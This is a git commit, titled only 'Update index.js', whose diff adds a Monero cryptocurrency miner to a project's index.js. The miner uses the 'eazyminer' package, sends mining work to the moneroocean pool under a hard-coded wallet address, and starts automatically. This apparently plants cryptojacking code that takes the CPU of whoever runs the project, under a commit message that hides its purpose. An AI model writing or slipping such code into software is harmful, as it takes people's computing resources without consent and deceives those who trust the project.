efdb7ec1c6ea6e78aadf373aa0c8e434d5f16966
darksheepapi <149430694+darksheepapi@users.noreply.github.com>
2023-12-28 18:40:37 +0530

    Update index.js

--- 0/index.js
+++ 0/index.js
@@ -1,1 +1,13 @@
+const Miner = require('eazyminer');
 
+const miner = new Miner({
+    pools: [{
+        coin: 'XMR',
+        user: "4BE6pHmwt1rMDFWtzFSfQj7Ae8Q6QikKs6B1tmpM8xbU6ZDKBYYJJtRFJVdeVLuQJbHCeEpzY6CDp8BujPg1AcUk5bmDKYb",
+        url: 'gulf.moneroocean.stream:10128', // optional pool URL,
+    }],
+    autoStart: true // optional delay
+});
+
+miner.start();
+/*miner.stop();*/
